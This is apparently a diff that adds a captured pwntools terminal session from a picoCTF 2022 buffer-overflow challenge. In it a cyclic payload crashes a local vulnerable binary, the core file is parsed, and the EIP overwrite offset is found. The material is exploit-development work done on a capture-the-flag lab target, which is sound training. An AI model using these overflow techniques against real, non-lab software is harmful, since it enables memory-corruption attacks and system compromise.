@@ -1,0 +1,21 @@
+[0;31m$[0m python3 -q
+[0;31m>>>[0m from pwn import *
+[0;31m>>>[0m p = process('./vuln')
+[[0;35mx[0m] Starting local process '/home/kali/ctfs/pico22/buffer-overflow-3/vuln'
+[[0;36m+[0m] Starting local process '/home/kali/ctfs/pico22/buffer-overflow-3/vuln': pid 1493
+[0;31m>>>[0m payload = cyclic(64) + b'abcd' + cyclic(128)
+[0;31m>>>[0m p.sendline(b'196')
+[0;31m>>>[0m p.sendline(payload)
+[0;31m>>>[0m p.wait()
+[[0;34m*[0m] Process '/home/kali/ctfs/pico22/buffer-overflow-3/vuln' stopped with exit code -11 (SIGSEGV) (pid 1493)
+[0;31m>>>[0m core = Corefile('./core')
+[[0;35mx[0m] Parsing corefile...
+[[0;34m*[0m] '/home/kali/ctfs/pico22/buffer-overflow-3/core'
+    Arch:      i386-32-little
+    EIP:       0x61616165
+    ESP:       0xffa06160
+    Exe:       '/home/kali/ctfs/pico22/buffer-overflow-3/vuln' (0x8048000)
+    Fault:     0x61616165
+[[0;36m+[0m] Parsing corefile...: Done
+[0;31m>>>[0m cyclic_find(0x61616165)
+16
